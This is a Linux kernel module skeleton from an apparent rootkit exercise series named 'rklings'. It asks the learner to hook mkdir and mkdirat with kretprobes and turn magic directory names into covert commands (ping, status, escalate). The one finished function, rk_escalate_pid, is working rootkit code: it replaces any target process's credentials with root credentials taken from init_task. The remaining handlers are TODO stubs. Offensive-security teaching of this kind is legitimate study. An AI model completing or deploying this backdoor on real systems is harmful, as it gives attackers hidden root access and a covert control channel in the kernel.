// SPDX-License-Identifier: GPL-2.0
//
// Your task: upgrade from kprobe to kretprobe and build a command
// dispatcher that routes "rklings.<cmd>[.<arg>]" mkdir names to
// handler functions (ping, status, escalate). Hook both
// __x64_sys_mkdir and __x64_sys_mkdirat.
//
#include <linux/atomic.h>
#include <linux/cred.h>
#include <linux/errno.h>
#include <linux/init.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/pid.h>
#include <linux/printk.h>
#include <linux/ptrace.h>
#include <linux/rcupdate.h>
#include <linux/sched.h>
#include <linux/sched/task.h>
#include <linux/string.h>
#include <linux/types.h>
#include <linux/uaccess.h>

#define RK_PREFIX     "rklings."
#define RK_PREFIX_LEN 8
#define RK_PATH_MAX   128

static atomic_t escalation_count = ATOMIC_INIT(0);
static int rk_escalate_pid(int pid)
{
	struct task_struct *task;
	struct cred *new_cred;
	const struct cred *old_cred, *old_real_cred;

	rcu_read_lock();
	task = pid_task(find_vpid(pid), PIDTYPE_PID);
	if (!task) {
		rcu_read_unlock();
		return -ESRCH;
	}
	get_task_struct(task);
	rcu_read_unlock();
	if (!task->mm) {
		put_task_struct(task);
		return -EINVAL;
	}
	new_cred = prepare_kernel_cred(&init_task);
	if (!new_cred) {
		put_task_struct(task);
		return -ENOMEM;
	}
	task_lock(task);
	old_cred = task->cred;
	old_real_cred = task->real_cred;
	get_cred(new_cred);
	rcu_assign_pointer(task->real_cred, new_cred);
	rcu_assign_pointer(task->cred, new_cred);
	task_unlock(task);
	put_cred(old_cred);
	put_cred(old_real_cred);
	put_task_struct(task);
	atomic_inc(&escalation_count);
	return 0;
}

// TODO: command handlers (ping, status, escalate) each takes (const char *arg)

// TODO: struct rk_cmd_entry + cmd_table[] + rk_dispatch (parse cmd.arg, route)

// TODO: bounded pathname copy, suppression, and mkdir/mkdirat entry/return pair

// TODO: struct kretprobe for mkdir and mkdirat

static int __init rk_init(void)
{
	// TODO: register both kretprobes with rollback on failure
	return 0;
}

static void __exit rk_exit(void)
{
	// TODO: tear down both kretprobes in reverse order
}

module_init(rk_init);
module_exit(rk_exit);
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Rklings command dispatcher");
